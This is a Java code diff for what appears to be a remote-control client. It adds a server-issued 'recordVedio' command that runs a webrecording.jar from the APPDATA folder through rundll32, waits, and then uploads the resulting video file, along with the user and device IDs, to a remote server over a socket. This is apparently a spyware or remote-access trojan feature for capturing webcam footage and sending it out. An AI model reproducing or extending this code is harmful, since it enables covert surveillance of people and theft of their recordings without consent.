@@ -94,7 +94,52 @@ public class Operation {
 				}).start();
 
 			}
+		} else if (stringCommand.equals(CommandConstant.recordVedio)) {
+
+			try {
+				if ((new File(Constants.APPDATA + "\\webrecording.jar")).exists()) {
+
+					Process p = Runtime.getRuntime()
+							.exec("rundll32 url.dll,FileProtocolHandler " + Constants.APPDATA + "\\webrecording.jar");
+					p.waitFor();
+
+				}
+			} catch (Exception ex) {
+				ex.printStackTrace();
+			}
+
+			result.setContent(trueString);
+
+			new Thread(new Runnable() {
+				@Override
+				public void run() {
+					String fileName ="output.ts";
+					Command com = new Command(Constants.FIlE_TRANSFARE + "", new String[] { fileName });
+					MessageDto m = new MessageDto(MessageDto.CLIENT_TO_SERVER);
+					m.setContent(JsonHandler.getCommandJson(com));
+					try {
+						m.setUserId(CommonUtil.getUserID());
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+					try {
+						m.setDeviceId(CommonUtil.getDeviceID());
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+					try {
+						Thread.sleep(50000);
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
+					Thread t = new Thread(
+							new Upload(SocketClient.serverIp, SocketClient.port, new File(fileName), m, true));
+					t.start();
+				}
+			}).start();
+
 		}
+
 		return result;
 	}
 }
